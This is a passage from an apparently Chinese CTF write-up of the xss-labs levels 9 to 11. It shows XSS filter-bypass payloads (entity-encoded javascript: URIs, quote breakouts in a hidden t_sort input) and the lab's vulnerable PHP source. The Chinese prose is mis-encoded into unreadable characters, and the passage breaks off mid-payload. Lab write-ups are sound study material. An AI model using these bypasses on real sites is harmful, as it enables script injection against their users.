src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2009.16.27.png" style="zoom:50%;"><p>keyword inputæ¡†çš„valueå€¼ä¸­å·¦å³å°–æ‰©æ‹›ã€åŒå¼•å·åšäº†è½¬è¯‘ï¼Œç¬¦åˆhtmlspecialcharså‡½æ•°çš„ç‰¹å¾ã€‚</p><ul><li>è¾“å…¥æ ¼å¼åˆæ³•çš„é“¾æ¥å°è¯•</li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2009.20.59.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2009.21.32.png" style="zoom:50%;"><p>ç‚¹å‡»å‹æƒ…é“¾æ¥ï¼ŒæˆåŠŸè®¿é—®åˆ°è¿è¡Œåœ¨127.0.0.1:80çš„webæœåŠ¡ã€‚</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2009.22.05.png" style="zoom:50%;"><ul><li>XSSæ”»å‡»æ€è·¯</li></ul><p>1ï¼‰try1</p><p>å…ˆç”¨åˆæ³•çš„é“¾æ¥æ ¼å¼é—­åˆæ‰æ ‡ç­¾ï¼Œç„¶åæ·»åŠ äº‹ä»¶å±æ€§ã€‚</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token string">" onmouseover="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token string">" "</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2009.25.59.png" style="zoom:50%;"><p>é“¾æ¥åˆæ³•ä½†æ˜¯payloadçš„æ•°æ®ç»è¿‡äº†å¤„ç†ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">&amp;</span>quot o_nmouseover<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token function">quotalert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">&amp;</span>quot <span class="token operator">&amp;</span>quot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åŒå¼•å·è¢«ç¼–ç ï¼Œonä¸­é—´åŠ äº†ä¸‹åˆ’çº¿ã€‚</p><p>2ï¼‰try2</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token string">" Onmouseover="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token string">" "</span><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">&amp;</span>quot o_nmouseover<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token function">quotalert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">&amp;</span>quot <span class="token operator">&amp;</span>quot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¤§å†™è½¬åŒ–ä¸ºäº†å°å†™ã€‚</p><p>3ï¼‰try3</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span> Onmouseover<span class="token operator">=</span><span class="token string">'alert(/xss/)'</span> <span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span>æœåŠ¡ç«¯å¤„ç†åï¼š<span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span> o_nmouseover<span class="token operator">=</span><span class="token string">'alert(/xss/)'</span> <span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2009.35.04.png" style="zoom:50%;"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span> <span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6e<span class="token punctuation">;</span>mouseover<span class="token operator">=</span><span class="token string">'alert(/xss/)'</span> <span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span> <span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6d<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x75<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x65<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x76<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x65<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">=</span><span class="token string">'alert(/xss/)'</span> <span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span>æœåŠ¡ç«¯å¤„ç†åï¼š<span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span> <span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6e<span class="token punctuation">;</span>mouseover<span class="token operator">=</span><span class="token string">'alert(/xss/)'</span> <span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span> <span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6d<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x75<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x65<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x76<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x65<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">=</span><span class="token string">'alert(/xss/)'</span> <span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2009.37.11.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2009.57.01.png" style="zoom:50%;"><p>ä½†æ˜¯æ— æ³•å¼¹çª—ã€‚</p><p>4ï¼‰try4</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span> onmouseover<span class="token operator">=</span><span class="token string">'alert(/xss/)'</span> <span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å°è¯•oåé¢åŠ å›è½¦ï¼Œæ²¡æ•ˆæœã€‚</p><p>5ï¼‰åœ¨é“¾æ¥åå°è¯•å¼ºåŠ›POC</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token operator">&lt;</span>script SCRscriptIPT" ' Oonn<span class="token operator">&gt;</span><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token operator">&lt;</span>scr_ipt scrscr_iptipt<span class="token operator">&amp;</span>quot ' oo_nn<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>ç©ºæ ¼ä¿ç•™äº†</li><li>å¤§å†™è½¬åŒ–ä¸ºäº†å°å†™</li><li>scriptå’Œonä¸­é—´åŠ äº†ä¸‹åˆ’çº¿</li></ul><h2 id="9-3-ä»£ç å®¡è®¡"><a href="#9-3-ä»£ç å®¡è®¡" class="headerlink" title="9.3 ä»£ç å®¡è®¡"></a>9.3 ä»£ç å®¡è®¡</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"script"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"on"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"src"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"href"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str7</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&amp;quot'</span><span class="token punctuation">,</span><span class="token variable">$str6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword  value="'</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token operator">===</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str7</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'http://'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;center&gt;&lt;BR&gt;&lt;a href="æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼"&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span><span class="token operator">.</span><span class="token variable">$str7</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨strposæ£€æµ‹è¾“å…¥ä¸­æ˜¯å¦å­˜åœ¨http://ï¼Œhttp://å¹¶ä¸éœ€è¦å‡ºç°åœ¨å¼€å¤´ã€‚å¦‚ï¼š</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2009.49.15.png" style="zoom:50%;"><p>ä½†æ˜¯åŒå¼•å·è¢«ç¼–ç äº†ï¼Œå¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿ</p><p>å¯¹åŒå¼•å·è¿›è¡Œç¼–ç ä¹‹åè²Œä¼¼å¹¶ä¸èƒ½é—­åˆæ ‡ç­¾ï¼Ÿ</p><p>æ€è·¯æ‹“å±•ï¼š</p><p>ä¸ç”¨å°è¯•é—­åˆæ ‡ç­¾äº†ï¼Œç›´æ¥åœ¨alertä¸­åŒ…å«http://å­—ç¬¦ä¸²é€ƒè¿‡æ£€æµ‹ã€‚</p><p>æ„é€ å¦‚ä¸‹çš„payload:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&amp;</span>#x6a<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x76<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'http://'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2010.02.49.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2010.04.26.png" style="zoom:50%;"><h2 id="9-4-é—®é¢˜"><a href="#9-4-é—®é¢˜" class="headerlink" title="9.4 é—®é¢˜*"></a>9.4 é—®é¢˜*</h2><p>ä¸ºä»€ä¹ˆå¯¹åŒå¼•å·è¿›è¡Œç¼–ç <code>&amp;#x22;</code>ä¹‹åä¸èƒ½è¢«è§£ææˆ<code>"</code>ï¼Œè¿›è€Œé—­åˆhrefå±æ€§å‘¢ï¼Ÿ</p><p>è€Œjavascriptå´å¯ä»¥è§£æï¼Ÿ</p><p>HTMLå®ä½“ç¼–ç ç”¨åœ¨å±æ€§å€¼ä¸­ã€‚ä¹‹å‰å¯¹onmouseoverè¿›è¡Œç¼–ç å…¶å®æ˜¯å¯¹å±æ€§åè¿›è¡Œç¼–ç ã€‚</p><h2 id="å°ç»“-8"><a href="#å°ç»“-8" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>avascript ä¼ªåè®®HTMLå®ä½“ç¼–ç ï¼Œalertå­—ç¬¦ä¸²ç»•è¿‡ã€‚</p><p>âš ï¸ï¼šHTMLå®ä½“ç¼–ç ä¸€èˆ¬ç”¨åœ¨javascriptä¼ªåè®®ä¸­ï¼Œä¸ç”¨åœ¨åŒå¼•å·æ ‡ç­¾é—­åˆåœºæ™¯ä¸­ã€‚</p><h1 id="åã€level-10-ï¼ˆå›æ˜¾å‚æ•°éšè—ï¼‰"><a href="#åã€level-10-ï¼ˆå›æ˜¾å‚æ•°éšè—ï¼‰" class="headerlink" title="åã€level-10**ï¼ˆå›æ˜¾å‚æ•°éšè—ï¼‰"></a>åã€level-10**ï¼ˆå›æ˜¾å‚æ•°éšè—ï¼‰</h1><h2 id="10-1-é¢˜é¢"><a href="#10-1-é¢˜é¢" class="headerlink" title="10.1 é¢˜é¢"></a>10.1 é¢˜é¢</h2><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2010.35.16.png" style="zoom:50%;"><h2 id="10-2-è§£é¢˜"><a href="#10-2-è§£é¢˜" class="headerlink" title="10.2 è§£é¢˜"></a>10.2 è§£é¢˜</h2><ul><li>å‚æ•°æäº¤å’Œå›æ˜¾é€»è¾‘</li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2010.37.01.png" style="zoom:40%;"><p>ç›´æ¥åœ¨keywordå‚æ•°ä¸­ä¿®æ”¹æäº¤ï¼Œå›æ˜¾åœ¨é¡µé¢ä¸­ã€‚</p><ul><li>å¼ºåŠ›POCæ¢æµ‹æœåŠ¡ç«¯çš„è¿‡æ»¤å™¨</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script SCRscriptIPT " ' Oonn<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2010.38.18.png" style="zoom:40%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2010.39.06.png" style="zoom:50%;"><p>æ²¡æœ‰æœ‰æ•ˆçš„å›æ˜¾ï¼Œå¦‚ä½•æµ‹è¯•ï¼Ÿ</p><p>å­˜åœ¨t_linkã€t_historyã€t_sortä¸‰ä¸ªinputè¾“å…¥æ¡†ï¼Œå¯ä»¥é€šè¿‡GET/POSTæ–¹æ³•æäº¤ç›¸åº”åç§°çš„å‚æ•°æ¥æµ‹è¯•å›æ˜¾ã€‚</p><h2 id="10-3-ä»£ç å®¡è®¡"><a href="#10-3-ä»£ç å®¡è®¡" class="headerlink" title="10.3 ä»£ç å®¡è®¡"></a>10.3 ä»£ç å®¡è®¡</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str11</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form id=search&gt;&lt;input name="t_link"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_history"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_sort"  value="'</span><span class="token operator">.</span><span class="token variable">$str33</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°t_sortçš„GETç±»å‹çš„å‚æ•°ï¼Œç„¶åæ‹¼æ¥è¾“å‡ºã€‚</p><p>æ„é€ payload</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token number">123</span><span class="token string">" onmouseover='alert(/xss/)' type="</span>button<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2010.53.21.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2010.53.55.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2010.54.16.png" style="zoom:50%;"><h2 id="å°ç»“-9"><a href="#å°ç»“-9" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>éšè—çš„inputæ¡†å›æ˜¾æ£€æµ‹åŠç»•è¿‡ã€‚</p><h1 id="åä¸€ã€level-11-ï¼ˆå›æ˜¾å‚æ•°ä¸ºhttp-refererå­—æ®µï¼‰"><a href="#åä¸€ã€level-11-ï¼ˆå›æ˜¾å‚æ•°ä¸ºhttp-refererå­—æ®µï¼‰" class="headerlink" title="åä¸€ã€level-11**ï¼ˆå›æ˜¾å‚æ•°ä¸ºhttp refererå­—æ®µï¼‰"></a>åä¸€ã€level-11**ï¼ˆå›æ˜¾å‚æ•°ä¸ºhttp refererå­—æ®µï¼‰</h1><h2 id="11-1-é¢˜é¢"><a href="#11-1-é¢˜é¢" class="headerlink" title="11.1 é¢˜é¢"></a>11.1 é¢˜é¢</h2><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2010.57.02.png" style="zoom:40%;"><h2 id="11-2-è§£é¢˜"><a href="#11-2-è§£é¢˜" class="headerlink" title="11.2 è§£é¢˜"></a>11.2 è§£é¢˜</h2><ul><li>æ¢æµ‹å‚æ•°æäº¤ä¸å›æ˜¾é€»è¾‘</li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2010.57.35.png" style="zoom:50%;"><p>æŸ¥çœ‹æºä»£ç ï¼š</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2010.58.10.png" style="zoom:50%;"><p>è·Ÿä¸Šä¸€å…³ç±»ä¼¼ï¼Œæœ‰ä¸€äº›éšè—çš„è¡¨å•å±æ€§ã€‚æäº¤å‚æ•°æ£€æµ‹å›æ˜¾ã€‚</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.00.00.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.00.26.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°<code>t_sort</code>å¤„æœ‰å›æ˜¾ã€‚</p><ul><li>å¼ºåŠ›POCæ¢æµ‹è¿‡æ»¤é€»è¾‘</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script SCRscriptIPT " ' Oonn<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.01.57.png" style="zoom:50%;"><p>1ï¼‰å·¦å³å°–æ‹¬å·è¢«ç¼–ç </p><p>2ï¼‰æ²¡æœ‰åšå¤§å°å†™è½¬æ¢</p><p>3ï¼‰scriptå’Œonæ²¡æœ‰è¢«ç ´å</p><p>4ï¼‰åŒå¼•å·è¢«ç¼–ç </p><ul><li>æ„é€ payload</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token number">123</span><span class="token string">' onmouseover='</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token string">' type='</span>button<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.06.23.png" style="zoom:50%;"><p>å¼•å·ä¸åŒ¹é…ï¼Œæ— æ³•é—­åˆå±æ€§ã€‚</p><p>å°è¯•å¯¹åŒå¼•å·è¿›è¡Œç¼–ç ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token number">123</span><span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span> onmouseover<span class="token operator">=</span><span class="token string">'alert(/xss/)'</span> type<span class="token operator">=</span><span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span>button<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2011.08.53.png" style="zoom:50%;"><p>urlè²Œä¼¼æŠŠ<code>&amp;#x22;</code>å½“æˆäº†å‚æ•°<code>#x22;</code></p><p>å¯¹ä¸Šé¢çš„payloadè¿›è¡Œurlç¼–ç ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">%</span><span class="token number">31</span><span class="token operator">%</span><span class="token number">32</span><span class="token operator">%</span><span class="token number">33</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">%</span><span class="token number">78</span><span class="token operator">%</span><span class="token number">32</span><span class="token operator">%</span><span class="token number">32</span><span class="token operator">%</span>3b<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>6f<span class="token operator">%</span>6e<span class="token operator">%</span>6d<span class="token operator">%</span>6f<span class="token operator">%</span><span class="token number">75</span><span class="token operator">%</span><span class="token number">73</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span>6f<span class="token operator">%</span><span class="token 